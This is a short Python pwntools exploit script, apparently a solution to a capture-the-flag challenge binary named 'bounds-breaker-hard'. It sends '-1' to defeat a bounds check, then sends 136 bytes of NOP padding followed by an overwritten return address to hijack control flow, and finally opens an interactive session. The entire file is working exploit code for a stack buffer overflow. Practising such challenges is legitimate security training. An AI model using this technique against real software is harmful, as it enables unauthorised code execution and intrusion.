#!/usr/bin/env python3
from pwn import *

p = process('/challenge/bounds-breaker-hard')

padding = 136

payload = b'\x90' * padding + p64(0x401ef0)

p.sendline(b"-1")

p.send(payload)

p.interactive()

